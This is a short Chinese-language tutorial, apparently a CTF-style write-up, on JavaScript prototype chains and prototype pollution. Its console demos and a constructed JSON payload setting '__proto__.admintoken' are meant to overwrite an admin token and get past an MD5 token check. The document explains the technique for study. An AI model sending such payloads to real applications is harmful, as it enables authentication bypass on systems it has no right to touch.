# 原型对象及相关基础

在JavaScript中，一切皆为对象。每个实例对象都有一个原型对象，而该原型对象又指向另一个原型对象，如此层层递进，就构成了我们熟知的“原型链”。

实例对象可以通过`__proto__`属性访问其原型对象。例如：

```javascript
let obj = {};
console.log(obj.__proto__);  // 输出 obj 的原型对象
console.log(obj.__proto__.__proto__);  // 输出 obj 的原型对象的原型对象
```

## 利用原型链漏洞进行变量覆盖

假设存在一个场景，其中传入的 `querytoken` 与 `user.admintoken` 的 MD5 哈希值相同。在这种情况下，我们可以利用原型链中的漏洞来对 `admintoken` 进行赋值。

### 示例：通过修改构造函数原型对象来实现变量覆盖

`Array` 实例继承自 `Array.prototype`，因此我们可以通过更改 `Array.prototype` 来影响所有 `Array` 实例的行为。基于这一思路，我们可以通过修改原型对象来覆盖特定变量。

假设 `user` 和 `matrix` 都是数组类型（即 `Array`），那么我们可以通过修改 `matrix` 的原型对象来篡改 `user.admintoken` 的值。

#### 控制台演示原型链污染

以下是在控制台中演示如何通过原型链污染来修改 `admintoken` 的值：

```javascript
// 创建两个空数组
let a = [];
let b = [];

// 访问 b 的原型对象，并在原型上添加 admintoken 属性
b["__proto__"]["admintoken"] = "ccda";

// 检查 a 是否受到影响
console.log(a.admintoken);  // 输出: "ccda"
```

### 构造 payload

根据上述原理，我们可以构造一个 payload 来实现对 `admintoken` 的篡改。具体实现如下：

```javascript
// 构造 payload
let payload = JSON.stringify({ "__proto__": { "admintoken": "ccda" } });

// 发送 payload 到目标系统
// 例如，通过 HTTP 请求将 payload 作为参数传递
```

通过这种方式，我们成功地利用了 JavaScript 原型链的特性来实现了对 `admintoken` 的篡改。需要注意的是，这种操作可能会带来安全风险，因此在实际应用中应谨慎使用。